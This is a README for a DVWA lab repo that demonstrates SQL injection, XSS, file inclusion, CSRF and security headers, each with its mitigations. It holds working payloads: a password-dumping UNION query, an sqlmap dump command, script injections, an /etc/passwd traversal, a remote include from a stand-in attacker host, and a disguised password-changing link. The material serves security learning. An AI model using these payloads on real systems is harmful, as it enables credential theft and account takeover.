# Web-App Security 

## What this repo contains

Small, hands-on demos for learning and testing common web vulnerabilities on **DVWA (low)** in a local lab.

### Labs

1. **SQL Injection** — extract DB data via injectable parameters.

   * Quick payload: `1 UNION SELECT user,password FROM users#`
   * Quick command (sqlmap):

     ```bash
     sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sql/?id=18&Submit=Submit" \
       --cookie="PHPSESSID=<id>; security=low" -p id --batch --dump -T users -C user,password
     ```
   * Mitigation: parameterized queries (prepared statements), input validation, least-privilege DB user.

2. **Cross-Site Scripting (XSS)** — run attacker JS in victims’ browsers.

   * Stored payload: `<body onload=alert('test')>`
   * Reflected payload: `<script>alert("XSS Found");</script>`
   * Mitigation: contextual output encoding (e.g., `htmlspecialchars()`), CSP, auto-escaping templates.

3. **File Inclusion (LFI / RFI)** — read local files or include remote code.

   * LFI example: `?page=../../../../../../etc/passwd`
   * RFI example: `?page=http://attacker/csrf.html`
   * Mitigation: whitelist includes, `realpath()` checks, `allow_url_include=Off`, `open_basedir`, least privilege.

4. **Web Security Headers** — add headers to harden browsers.

   * Core headers to add in Apache:

     ```apache
     Header always set X-Frame-Options "SAMEORIGIN"
     Header set X-Content-Type-Options "nosniff"
     Header set Referrer-Policy "strict-origin-when-cross-origin"
     Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'"
     Header set Permissions-Policy "geolocation=(), microphone=(), camera=()"
     ```
   * For TLS: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
   * Verify with: `curl -I http://127.0.0.1/dvwa`

5. **CSRF (Cross-Site Request Forgery)** — force authenticated actions via crafted links.

   * Example attacker link (changes password):

     ```html
     <a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change#">Movie 720p</a>
     ```
   * Mitigation: synchronizer CSRF tokens, `SameSite` cookies, require POST for state changes, Origin/Referer checks.

---



